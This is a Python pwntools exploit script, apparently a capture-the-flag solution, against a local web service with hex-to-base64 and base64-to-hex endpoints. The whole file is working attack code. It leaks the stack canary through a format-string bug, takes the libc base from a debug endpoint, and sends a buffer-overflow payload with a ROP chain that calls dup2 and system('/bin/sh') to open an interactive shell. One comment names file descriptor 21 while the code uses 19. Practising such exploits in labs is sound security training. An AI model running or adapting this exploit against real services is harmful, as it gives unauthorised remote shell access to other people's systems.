#!/usr/bin/env python3

import requests
from base64 import b64encode, b64decode
from pwn import *

target_scheme = 'http'
target_host = 'localhost'
target_port = '8080'
context.arch = 'amd64'


def perform_leak(offset):
    resp = requests.post(f'{target_scheme}://{target_host}:{target_port}/hex_to_base64', json={
        'data': bytes(f'[%{offset}$lx]', 'utf-8').hex() + '20'*20,
    }).json()

    data = b64decode(resp['data'])
    leak = data.split(b'[')[1].split(b']')[0]
    return leak.strip()


def leak_canary():
    # warm up stack
    for _ in range(10): perform_leak(1)

    # find canary
    for i in range(21, 100):
        leak = perform_leak(i)
        if len(leak) == 16 and leak[-2:] == b'00':
            return leak


def leak_libc_base():
    resp = requests.get(f'{target_scheme}://{target_host}:{target_port}/debug')
    return resp.text.split('\n')[163].split('-')[0]


'''
Leak the stack canary so we can bypass the stack check in
our buffer overflow.
'''
log.info('leaking stack canary... may take some time')
canary = int(leak_canary(), 16)
log.info(f'canary = {hex(canary)}')

'''
Leak a libc address so we can build our ROP chain, used to
get a shell.
'''
libc = ELF('./libc-2.31.so', checksec=False)
libc.address = int(leak_libc_base(), 16)
log.info(f'libc.address = {hex(libc.address)}')

'''
Build our rop chain for system("/bin/sh"), redirecting
fd 21 (as this is the channel we are communicating over.
'''
rop = ROP(libc)
rop.call(libc.sym.dup2, [19, 0])
rop.call(libc.sym.dup2, [19, 1])
rop.call(libc.sym.dup2, [19, 2])

bin_sh = next(libc.search(b'/bin/sh\x00'))
rop.system(bin_sh)

log.info(rop.dump())

payload = b64encode(b'A'*504 + p64(canary) + b'A'*56 + rop.chain())
payload = f'{{"data":"{payload.decode("utf-8")}"}}'

r = remote(target_host, target_port, ssl=True if target_scheme == 'https' else False)
req = (
    f'POST /base64_to_hex HTTP/1.1\r\n'
    f'Host: {target_host}\r\n'
    f'Content-Type: application/json\r\n'
    f'Content-Length: {len(payload)}\r\n'
    f'\r\n'
    f'{payload}\r\n'
)
r.writeline(bytes(req, 'utf-8'))

r.interactive()
